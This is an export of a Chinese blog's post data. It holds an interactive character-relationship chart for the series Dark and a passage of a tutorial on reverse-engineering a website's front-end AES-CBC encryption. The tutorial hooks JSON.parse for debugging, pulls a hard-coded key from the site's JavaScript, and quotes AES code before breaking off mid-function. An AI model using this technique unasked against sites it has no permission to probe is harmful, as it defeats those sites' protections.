{"meta":{"title":"Gryffinbit的思维殿堂","subtitle":"","description":"一个网络安全网站","author":"Gryffinbit","url":"https://gryffinbit.top","root":"/"},"pages":[{"title":"artitalk","date":"2024-08-05T15:22:29.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"artitalk/index.html","permalink":"https://gryffinbit.top/artitalk/index.html","excerpt":"","text":""},{"title":"categories","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"categories/index.html","permalink":"https://gryffinbit.top/categories/index.html","excerpt":"","text":""},{"title":"alt er love","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"friends/index.html","permalink":"https://gryffinbit.top/friends/index.html","excerpt":"我会记住那些在大雨中为我撑伞的人，帮我挡住外来之物的人，黑暗中默默抱紧我的人；逗我笑的人，坐车来看望我的人，陪我哭过的人，总是以我为重的人。正是ta们，组成我生命中一点一滴的温暖，是这些温暖使我远离阴霾，守护我的天真和善良，做一个温柔阳光的人。","text":"我会记住那些在大雨中为我撑伞的人，帮我挡住外来之物的人，黑暗中默默抱紧我的人；逗我笑的人，坐车来看望我的人，陪我哭过的人，总是以我为重的人。正是ta们，组成我生命中一点一滴的温暖，是这些温暖使我远离阴霾，守护我的天真和善良，做一个温柔阳光的人。 ☀️可以在留言板里，写下想对我说的话哦～☀️"},{"title":"spirit","date":"2024-10-17T20:11:16.000Z","updated":"2024-10-17T15:59:53.000Z","comments":true,"path":"spirit/index.html","permalink":"https://gryffinbit.top/spirit/index.html","excerpt":"","text":""},{"title":"tags","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"tags/index.html","permalink":"https://gryffinbit.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Dark暗黑人物关系图梳理","slug":"Dark暗黑人物关系图梳理","date":"2025-09-08T06:36:46.000Z","updated":"2025-09-08T02:23:11.897Z","comments":true,"path":"2025/09/08/Dark暗黑人物关系图梳理/","permalink":"https://gryffinbit.top/2025/09/08/Dark%E6%9A%97%E9%BB%91%E4%BA%BA%E7%89%A9%E5%85%B3%E7%B3%BB%E5%9B%BE%E6%A2%B3%E7%90%86/","excerpt":"","text":"《Dark》主要人物家族关系图最近在看德剧 Dark 暗黑，因为他的人物关系很复杂，并且每个角色有不同的时空和扮演者，所以梳理了一个家族关系图。每个节点点开都有对应的描述和人物从童年到青年到中年对应的照片。 描述比较口头化，就是自己看着懂就行。 父母和子女是上下层级关系、夫妻和兄弟是平级关系。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;《Dark》人物关系图&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;https://unpkg.com/vis-network/standalone/umd/vis-network.min.js&quot;&gt;&lt;/script&gt; &lt;style&gt; * &#123; box-sizing: border-box; margin: 0; padding: 0; &#125; body &#123; font-family: Arial, &quot;Microsoft YaHei&quot;, sans-serif; margin: 0; padding: 10px; background-color: #1a1a1a; color: #e6e6e6; overflow: hidden; height: 100vh; &#125; .container &#123; display: flex; flex-direction: column; height: 100vh; max-width: 100%; margin: 0 auto; &#125; header &#123; padding: 10px 0; margin-bottom: 10px; text-align: center; border-bottom: 1px solid #333; &#125; h2 &#123; font-size: 24px; color: #e6e6e6; margin-bottom: 5px; &#125; .instructions &#123; padding: 8px; background-color: #2a2a2a; border-radius: 5px; font-size: 14px; border-left: 3px solid #3498db; margin-bottom: 10px; &#125; #mynetwork &#123; flex: 1; width: 100%; border: 1px solid #444; border-radius: 5px; background-color: #2c2c2c; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); min-height: 0; /* 重要：允许flex收缩 */ &#125; /* 模态框样式 */ .modal &#123; display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.85); &#125; .modal-content &#123; position: relative; background-color: #2c2c2c; margin: 5% auto; padding: 20px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5); width: 85%; max-width: 700px; animation: modalopen 0.3s; color: #e6e6e6; &#125; @keyframes modalopen &#123; from &#123;opacity: 0; transform: translateY(-40px);&#125; to &#123;opacity: 1; transform: translateY(0);&#125; &#125; .close &#123; color: #aaa; position: absolute; right: 20px; top: 15px; font-size: 28px; font-weight: bold; cursor: pointer; z-index: 10; &#125; .close:hover &#123; color: #fff; &#125; .character-details &#123; display: flex; flex-direction: column; &#125; .character-info &#123; margin-bottom: 15px; &#125; .character-name &#123; font-size: 22px; color: #f0f0f0; margin-bottom: 5px; &#125; .character-name-en &#123; font-size: 16px; color: #aaa; margin-bottom: 15px; font-style: italic; &#125; .character-description &#123; font-size: 15px; line-height: 1.5; margin-bottom: 15px; &#125; /* 图片轮播样式 */ .carousel &#123; position: relative; width: 100%; margin-top: 15px; &#125; .carousel-inner &#123; position: relative; width: 100%; overflow: hidden; border-radius: 5px; &#125; .carousel-item &#123; display: none; text-align: center; &#125; .carousel-item.active &#123; display: block; &#125; .carousel-item img &#123; max-width: 100%; max-height: 300px; border-radius: 5px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); &#125; .carousel-control &#123; position: absolute; top: 50%; transform: translateY(-50%); background-color: rgba(0, 0, 0, 0.5); color: white; border: none; width: 40px; height: 40px; border-radius: 50%; font-size: 20px; cursor: pointer; z-index: 5; &#125; .carousel-control.prev &#123; left: 10px; &#125; .carousel-control.next &#123; right: 10px; &#125; .carousel-control:hover &#123; background-color: rgba(0, 0, 0, 0.8); &#125; .carousel-indicators &#123; display: flex; justify-content: center; margin-top: 10px; &#125; .carousel-indicator &#123; width: 10px; height: 10px; border-radius: 50%; background-color: #555; margin: 0 5px; cursor: pointer; &#125; .carousel-indicator.active &#123; background-color: #3498db; &#125; /* 响应式设计 */ @media (min-width: 768px) &#123; .character-details &#123; flex-direction: row; &#125; .character-info &#123; flex: 1; padding-right: 20px; margin-bottom: 0; &#125; .carousel &#123; flex: 1; margin-top: 0; &#125; &#125; @media (max-height: 700px) &#123; .modal-content &#123; margin: 2% auto; padding: 15px; &#125; .carousel-item img &#123; max-height: 250px; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;header&gt; &lt;h2&gt;《Dark》主要人物家族关系图&lt;/h2&gt; &lt;div class=&quot;instructions&quot;&gt; &lt;p&gt;提示：所有节点都可以拖动，但亚当和诺亚可以自由移动，其他节点会保持层次布局。&lt;br&gt;点击人物名称可以查看详细信息。&lt;/p&gt; &lt;/div&gt; &lt;/header&gt; &lt;div id=&quot;mynetwork&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 人物详情模态框 --&gt; &lt;div id=&quot;characterModal&quot; class=&quot;modal&quot;&gt; &lt;div class=&quot;modal-content&quot;&gt; &lt;span class=&quot;close&quot;&gt;&amp;times;&lt;/span&gt; &lt;div id=&quot;modalContent&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 人物详情数据 var characterData = &#123; 1: &#123; name: &quot;埃贡·蒂徳曼&quot;, nameEn: &quot;Egon Tiedemann&quot;, description: &quot;警长，逮捕了穿越过去的乌利希，认为是他杀了很多小孩。跟青年乌利希对着干，因为那个时候青年乌利希崇拜撒旦。&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906210847993.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906215907168.png&quot; ] &#125;, 2: &#123; name: &quot;多丽丝·蒂德曼&quot;, nameEn: &quot;Doris Tiedemann&quot;, description: &quot;女同, 艾格尼丝·尼尔森的情人&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250907004307055.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250907004435073.png&quot; ] &#125;, 3: &#123; name: &quot;克劳迪娅·蒂徳曼&quot;, nameEn: &quot;Claudia Tiedemann&quot;, description: &quot;时间旅人，异瞳，一蓝一黄。核电站女厂长。小的时候跟黑格尔一起玩，然后黑格尔把她的狗放进了山洞。&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220258186.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220322457.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220343786.png&quot; ] &#125;, 4: &#123; name: &quot;雷吉娜·蒂徳曼&quot;, nameEn: &quot;Regina Tiedemann&quot;, description: &quot;克劳迪娅的女儿，她开了一个酒店，因为温登小镇有人失踪之后还不上钱，酒店开不下去了，后来得了乳腺癌。也是卡特琳娜·尼尔森在她小的时候，把她绑到树林里去了。&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220136335.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220236396.png&quot; ] &#125;, 5: &#123; name: &quot;亚历山大·蒂徳曼&quot;, nameEn: &quot;Aleksander Tiedemann&quot;, description: &quot;身分不明有很多ID，是突然出现在小镇的神秘人，后来接管了核电站&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906215919249.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906215933110.png&quot; ] &#125;, 6: &#123; name: &quot;黑格尔·多普勒&quot;, nameEn: &quot;Helge Doppler&quot;, description: &quot;核电看门人，乌利希认为是他杀了那些小孩。黑格尔中年是核电厂的看门人，警长问过他，为什么不走森林小道。他老年的时候在精神病养老院。&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220448705.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220506696.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220515136.png&quot; ] &#125;, 7: &#123; name: &quot;彼得·多普勒&quot;, nameEn: &quot;Peter Doppler&quot;, description: &quot;女警长的丈夫，男同，偷偷男同并且去小车里面和那个你认为是女的的那个男的瑟瑟。&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220608708.png&quot; ] &#125;, 8: &#123; name: &quot;夏洛特·多普勒&quot;, nameEn: &quot;Charlotte Doppler&quot;, description: &quot;女警长，捡起来死去的小鸟，她的公公是黑格尔。她的身世还没揭晓，但是她并不知道她真实的父母是谁（可能是诺亚）&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220635713.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220703250.png&quot; ] &#125;, 9: &#123; name: &quot;伊丽莎白&quot;, nameEn: &quot;Elisabeth Doppler&quot;, description: &quot;聋哑人，未来战争时期首领、她小的时候失踪过，带着小狐狸帽子&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220716683.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220740260.png&quot; ] &#125;, 10: &#123; name: &quot;乌利希·尼尔森&quot;, nameEn: &quot;Ulrich Nielsen&quot;, description: &quot;警察&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221003832.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221015437.png&quot; ] &#125;, 11: &#123; name: &quot;卡特琳娜·尼尔森&quot;, nameEn: &quot;Katharina Nielsen&quot;, description: &quot;曾绑架雷吉娜，校园霸凌&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220859536.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220909165.png&quot; ] &#125;, 12: &#123; name: &quot;米凯尔·尼尔森&quot;, nameEn: &quot;Mikkel Nielsen&quot;, description: &quot;约纳斯的父亲，后来自杀了&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220925918.png&quot; ] &#125;, 13: &#123; name: &quot;玛莎·尼尔森&quot;, nameEn: &quot;Martha Nielsen&quot;, description: &quot;约纳斯爱慕对象，但论辈分其实是他的姑姑&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221029024.png&quot; ] &#125;, 14: &#123; name: &quot;艾格尼丝·尼尔森&quot;, nameEn: &quot;Agnes Nielsen&quot;, description: &quot;诺亚的姐姐、女同，是乌利希的祖母。是老警长（埃贡蒂徳曼）妻子的情人&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906220822546.png&quot; ] &#125;, 15: &#123; name: &quot;约纳斯·卡恩瓦尔德&quot;, nameEn: &quot;Jonas Kahnwald&quot;, description: &quot;男主&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221054633.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221103871.png&quot; ] &#125;, 16: &#123; name: &quot;汉娜&quot;, nameEn: &quot;Hannah&quot;, description: &quot;曾与乌利希出轨&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221117160.png&quot;, &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906221124564.png&quot; ] &#125;, 17: &#123; name: &quot;亚当&quot;, nameEn: &quot;Adam&quot;, description: &quot;幕后boss&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906210545195.png&quot; ] &#125;, 18: &#123; name: &quot;诺亚&quot;, nameEn: &quot;Noah&quot;, description: &quot;时间旅人, 坏势力，有一个小屋用来杀小孩测时光机器&quot;, images: [ &quot;https://blog-1310394682.cos.ap-beijing.myqcloud.com/20250906210759695.png&quot; ] &#125; &#125;; var nodes = new vis.DataSet([ // Tiedemann 家族 &#123; id: 1, label: &quot;埃贡·蒂徳曼&quot;, group: &quot;Tiedemann&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 2, label: &quot;多丽丝·蒂德曼&quot;, group: &quot;Tiedemann&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 3, label: &quot;克劳迪娅·蒂徳曼&quot;, group: &quot;Tiedemann&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 4, label: &quot;雷吉娜·蒂徳曼&quot;, group: &quot;Tiedemann&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 5, label: &quot;亚历山大·蒂徳曼&quot;, group: &quot;Tiedemann&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 100, label: &quot;&quot;, hidden: true &#125;, // Doppler 家族 &#123; id: 6, label: &quot;黑格尔·多普勒&quot;, group: &quot;Doppler&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 7, label: &quot;彼得·多普勒&quot;, group: &quot;Doppler&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 8, label: &quot;夏洛特·多普勒&quot;, group: &quot;Doppler&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 9, label: &quot;伊丽莎白&quot;, group: &quot;Doppler&quot;, font: &#123; size: 18 &#125; &#125;, // Nielsen 家族 &#123; id: 10, label: &quot;乌利希·尼尔森&quot;, group: &quot;Nielsen&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 11, label: &quot;卡特琳娜·尼尔森&quot;, group: &quot;Nielsen&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 12, label: &quot;米凯尔·尼尔森&quot;, group: &quot;Nielsen&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 13, label: &quot;玛莎·尼尔森&quot;, group: &quot;Nielsen&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 14, label: &quot;艾格尼丝·尼尔森&quot;, group: &quot;Nielsen&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 18, label: &quot;诺亚&quot;, group: &quot;Nielsen&quot;, physics: true, fixed: false, font: &#123; size: 20 &#125; &#125;, // 可以自由移动 &#123; id: 101, label: &quot;&quot;, hidden: true &#125;, // Kahnwald 家族 &#123; id: 15, label: &quot;约纳斯·卡恩瓦尔德&quot;, group: &quot;Kahnwald&quot;, font: &#123; size: 18 &#125; &#125;, &#123; id: 16, label: &quot;汉娜&quot;, group: &quot;Kahnwald&quot;, font: &#123; size: 18 &#125; &#125;, // 独立人物 &#123; id: 17, label: &quot;亚当&quot;, group: &quot;Other&quot;, physics: true, fixed: false, font: &#123; size: 20 &#125; &#125; // 可以自由移动 ]); var edges = new vis.DataSet([ // Tiedemann &#123; from: 1, to: 3 &#125;, &#123; from: 2, to: 3 &#125;, &#123; from: 3, to: 4 &#125;, &#123; from: 3, to: 100 &#125;, &#123; from: 100, to: 4 &#125;, &#123; from: 100, to: 5 &#125;, // Doppler &#123; from: 6, to: 7 &#125;, &#123; from: 7, to: 9 &#125;, &#123; from: 8, to: 9 &#125;, // Nielsen &#123; from: 10, to: 12 &#125;, &#123; from: 11, to: 12 &#125;, &#123; from: 10, to: 13 &#125;, &#123; from: 11, to: 13 &#125;, &#123; from: 14, to: 101 &#125;, &#123; from: 18, to: 101 &#125;, &#123; from: 101, to: 14 &#125;, &#123; from: 101, to: 18 &#125;, &#123; from: 14, to: 10 &#125;, // Kahnwald &#123; from: 12, to: 15 &#125;, &#123; from: 16, to: 15 &#125; ]); var container = document.getElementById(&quot;mynetwork&quot;); var data = &#123; nodes: nodes, edges: edges &#125;; var options = &#123; layout: &#123; improvedLayout: true, hierarchical: &#123; enabled: true, direction: &quot;UD&quot;, sortMethod: &quot;directed&quot;, levelSeparation: 120, nodeSpacing: 150 &#125; &#125;, nodes: &#123; shape: &quot;box&quot;, margin: 12, widthConstraint: &#123; maximum: 160 &#125;, fixed: &#123; x: false, y: false &#125;, font: &#123; size: 18, // 默认节点字体大小 face: &quot;Microsoft YaHei&quot;, color: &quot;#e6e6e6&quot; &#125; &#125;, edges: &#123; arrows: &#123; to: &#123; enabled: false &#125; &#125;, smooth: true, font: &#123; size: 14, strokeWidth: 0 &#125;, width: 2, color: &#123; color: &quot;#aaaaaa&quot;, highlight: &quot;#3498db&quot; &#125; &#125;, groups: &#123; Tiedemann: &#123; color: &#123; background: &quot;#2c5aa0&quot;, border: &quot;#1a3c6e&quot;, highlight: &#123; background: &quot;#3a6ac0&quot;, border: &quot;#2a5aae&quot; &#125; &#125; &#125;, Doppler: &#123; color: &#123; background: &quot;#2c8c54&quot;, border: &quot;#1a6a34&quot;, highlight: &#123; background: &quot;#3cac74&quot;, border: &quot;#2a8a54&quot; &#125; &#125; &#125;, Nielsen: &#123; color: &#123; background: &quot;#b88c2c&quot;, border: &quot;#966a1a&quot;, highlight: &#123; background: &quot;#d8ac4c&quot;, border: &quot;#b68a2a&quot; &#125; &#125; &#125;, Kahnwald: &#123; color: &#123; background: &quot;#a82c2c&quot;, border: &quot;#861a1a&quot;, highlight: &#123; background: &quot;#c84c4c&quot;, border: &quot;#a62a2a&quot; &#125; &#125; &#125;, Other: &#123; color: &#123; background: &quot;#6c2c9c&quot;, border: &quot;#4a1a7a&quot;, highlight: &#123; background: &quot;#8c4cbc&quot;, border: &quot;#6a2a9a&quot; &#125; &#125; &#125; &#125;, physics: &#123; enabled: true, stabilization: &#123; enabled: true, iterations: 1000 &#125;, hierarchicalRepulsion: &#123; avoidOverlap: 1, nodeDistance: 150 &#125; &#125;, interaction: &#123; dragNodes: true, dragView: true, zoomView: true, tooltipDelay: 200 &#125; &#125;; var network = new vis.Network(container, data, options); // 在布局稳定后，禁用物理效果，但保持亚当和诺亚可拖动 network.on(&quot;stabilizationIterationsDone&quot;, function() &#123; // 设置所有节点为固定，除了亚当和诺亚 nodes.forEach(function(node) &#123; if (node.id !== 17 &amp;&amp; node.id !== 18) &#123; nodes.update(&#123;id: node.id, fixed: true&#125;); &#125; &#125;); // 禁用物理效果，但允许手动拖动 options.physics.enabled = false; network.setOptions(options); &#125;); // 添加点击节点事件 network.on(&quot;click&quot;, function(params) &#123; if (params.nodes.length &gt; 0) &#123; var nodeId = params.nodes[0]; showCharacterDetails(nodeId); &#125; &#125;); // 获取模态框元素 var modal = document.getElementById(&quot;characterModal&quot;); var modalContent = document.getElementById(&quot;modalContent&quot;); var closeBtn = document.getElementsByClassName(&quot;close&quot;)[0]; // 关闭模态框 closeBtn.onclick = function() &#123; modal.style.display = &quot;none&quot;; &#125; // 点击模态框外部关闭 window.onclick = function(event) &#123; if (event.target == modal) &#123; modal.style.display = &quot;none&quot;; &#125; &#125; // 显示人物详情函数 function showCharacterDetails(nodeId) &#123; var character = characterData[nodeId]; if (!character) &#123; modalContent.innerHTML = &quot;&lt;p&gt;暂无该人物的详细信息&lt;/p&gt;&quot;; modal.style.display = &quot;block&quot;; return; &#125; var html = &#x27;&lt;div class=&quot;character-details&quot;&gt;&#x27;; html += &#x27;&lt;div class=&quot;character-info&quot;&gt;&#x27;; html += &#x27;&lt;h2 class=&quot;character-name&quot;&gt;&#x27; + character.name + &#x27;&lt;/h2&gt;&#x27;; html += &#x27;&lt;h3 class=&quot;character-name-en&quot;&gt;&#x27; + character.nameEn + &#x27;&lt;/h3&gt;&#x27;; html += &#x27;&lt;p class=&quot;character-description&quot;&gt;&#x27; + character.description + &#x27;&lt;/p&gt;&#x27;; html += &#x27;&lt;/div&gt;&#x27;; // 添加图片轮播 if (character.images &amp;&amp; character.images.length &gt; 0) &#123; html += &#x27;&lt;div class=&quot;carousel&quot;&gt;&#x27;; html += &#x27;&lt;div class=&quot;carousel-inner&quot;&gt;&#x27;; for (var i = 0; i &lt; character.images.length; i++) &#123; var activeClass = i === 0 ? &#x27;active&#x27; : &#x27;&#x27;; html += &#x27;&lt;div class=&quot;carousel-item &#x27; + activeClass + &#x27;&quot; data-index=&quot;&#x27; + i + &#x27;&quot;&gt;&#x27;; html += &#x27;&lt;img src=&quot;&#x27; + character.images[i] + &#x27;&quot; alt=&quot;&#x27; + character.name + &#x27;&quot;&gt;&#x27;; html += &#x27;&lt;/div&gt;&#x27;; &#125; if (character.images.length &gt; 1) &#123; html += &#x27;&lt;button class=&quot;carousel-control prev&quot;&gt;&amp;lt;&lt;/button&gt;&#x27;; html += &#x27;&lt;button class=&quot;carousel-control next&quot;&gt;&amp;gt;&lt;/button&gt;&#x27;; &#125; html += &#x27;&lt;/div&gt;&#x27;; // 添加指示器 if (character.images.length &gt; 1) &#123; html += &#x27;&lt;div class=&quot;carousel-indicators&quot;&gt;&#x27;; for (var j = 0; j &lt; character.images.length; j++) &#123; var activeIndicator = j === 0 ? &#x27;active&#x27; : &#x27;&#x27;; html += &#x27;&lt;div class=&quot;carousel-indicator &#x27; + activeIndicator + &#x27;&quot; data-index=&quot;&#x27; + j + &#x27;&quot;&gt;&lt;/div&gt;&#x27;; &#125; html += &#x27;&lt;/div&gt;&#x27;; &#125; html += &#x27;&lt;/div&gt;&#x27;; &#125; html += &#x27;&lt;/div&gt;&#x27;; modalContent.innerHTML = html; modal.style.display = &quot;block&quot;; // 初始化轮播功能 if (character.images &amp;&amp; character.images.length &gt; 1) &#123; initCarousel(); &#125; &#125; // 初始化轮播功能 function initCarousel() &#123; var currentIndex = 0; var items = document.querySelectorAll(&#x27;.carousel-item&#x27;); var indicators = document.querySelectorAll(&#x27;.carousel-indicator&#x27;); var prevBtn = document.querySelector(&#x27;.carousel-control.prev&#x27;); var nextBtn = document.querySelector(&#x27;.carousel-control.next&#x27;); function showSlide(index) &#123; // 隐藏所有幻灯片 items.forEach(function(item) &#123; item.classList.remove(&#x27;active&#x27;); &#125;); // 显示当前幻灯片 items[index].classList.add(&#x27;active&#x27;); // 更新指示器 indicators.forEach(function(indicator) &#123; indicator.classList.remove(&#x27;active&#x27;); &#125;); indicators[index].classList.add(&#x27;active&#x27;); currentIndex = index; &#125; // 上一张按钮事件 if (prevBtn) &#123; prevBtn.onclick = function() &#123; var newIndex = (currentIndex - 1 + items.length) % items.length; showSlide(newIndex); &#125;; &#125; // 下一张按钮事件 if (nextBtn) &#123; nextBtn.onclick = function() &#123; var newIndex = (currentIndex + 1) % items.length; showSlide(newIndex); &#125;; &#125; // 指示器点击事件 indicators.forEach(function(indicator) &#123; indicator.onclick = function() &#123; var index = parseInt(this.getAttribute(&#x27;data-index&#x27;)); showSlide(index); &#125;; &#125;); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"html","slug":"html","permalink":"https://gryffinbit.top/tags/html/"}],"author":"Gryffinbit"},{"title":"JS前端加密算法逆向解密","slug":"JS前端逆向解密","date":"2025-09-08T06:36:46.000Z","updated":"2025-09-08T07:23:35.799Z","comments":true,"path":"2025/09/08/JS前端逆向解密/","permalink":"https://gryffinbit.top/2025/09/08/JS%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/","excerpt":"","text":"JS 前端逆向解密最近学习的时候，遇到一个网站，因为手动输入邀请码觉得很麻烦，就想写个小脚本去处理，在实践的过程中，发现它对后端返回的内容进行了加密。遂，开始研究，对算法进行解密 思路说明 先发包，抓包，发现了被加密的内容 JS前端进行断点调试 找到_encrypteData 参数 根据堆栈内提到的文件，去筛选decrypt文件。 分析decrypt文件，确认加密模式：AES-CBC 的加密方式【GPT辅助分析】 在decrypt JS 中，去寻找固定密钥（字节数组）【GPT辅助分析，让它去找到密钥】 根据密钥和加密算法，写对应的解密python脚本 具体实践JS前端进行断点调试F12，打开开发者，在控制台输入以下代码，进行断点调试 12345678(function()&#123; var parse_ = JSON.parse; JSON.parse = function(arg)&#123; console.log(&#x27;断住了&#x27;); debugger; return parse_(arg); &#125;&#125;)() 点击想要调试的位置，会自动断点 最右是打开&#x2F;关闭断点的按钮，最左是放行&#x2F;拦截，中间是跳入下一个函数、跳入上一个函数，调试按钮。 先点击想要破解数据包的那个功能键，让数据产生的过程“暂停”。在达到这个功能点之前，可以先不开启断点功能。在准备点击这个功能点的时候，再打开断点。点击打开&#x2F;关闭断点的按钮，让它处于正在断点的过程。比如我准备发的包，是在点击确认之后产生的，我整个调试界面，就是停在了，确认已经被点击下去的页面。 找到_encrypteData 参数我们在准备点击确认的时候，开启了断点调试。然后点击确认，再放行，断点就会直接跑到加密的那个地方。 此时我们调试的意义就是，开始探究：从点击确认之后 到 产生想要破解的数据包，这个过程，函数的调用和数据的流向。 根据堆栈内提到的文件，去筛选decrypt文件右边是整个函数调用的堆栈，既然已经找到加密后的数据，那就一定可以在这个调用的堆栈中找到解密的过程。我在这里直接开始输入关键词decrypt进行搜索 分析decrypt文件，确认加密模式：AES-CBC 的加密方式【GPT辅助分析】在这里我们就可以清晰的看到它的整个加解密过程了，我直接发给GPT让它给我分析加密算法了。 分析过后，发现是采用的AES-CBC的加密方式。 并且找到了固定密钥就在JS文件中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162e.prototype.encrypt = function(e) &#123; if (16 != e.length) throw new Error(&quot;invalid size &quot;); for (var t = this._Ke.length - 1, r = [0, 0, 0, 0], n = M(e), o = 0; o &lt; 4; o++) n[o] ^= this._Ke[0][o]; for (var a = 1; a &lt; t; a++) &#123; for (o = 0; o &lt; 4; o++) r[o] = l[n[o] &gt;&gt; 24 &amp; 255] ^ d[n[(o + 1) % 4] &gt;&gt; 16 &amp; 255] ^ h[n[(o + 2) % 4] &gt;&gt; 8 &amp; 255] ^ p[255 &amp; n[(o + 3) % 4]] ^ this._Ke[a][o]; n = r.slice() &#125; var s, c = i(16); for (o = 0; o &lt; 4; o++) s = this._Ke[t][o], c[4 * o] = 255 &amp; (u[n[o] &gt;&gt; 24 &amp; 255] ^ s &gt;&gt; 24), c[4 * o + 1] = 255 &amp; (u[n[(o + 1) % 4] &gt;&gt; 16 &amp; 255] ^ s &gt;&gt; 16), c[4 * o + 2] = 255 &amp; (u[n[(o + 2) % 4] &gt;&gt; 8 &amp; 255] ^ s &gt;&gt; 8), c[4 * o + 3] = 255 &amp; (u[255 &amp; n[(o + 3) % 4]] ^ s); return c &#125; , e.prototype.decrypt = function(e) &#123; if (16 != e.length) throw new Error(&quot;invalid size&quot;); for (var t = 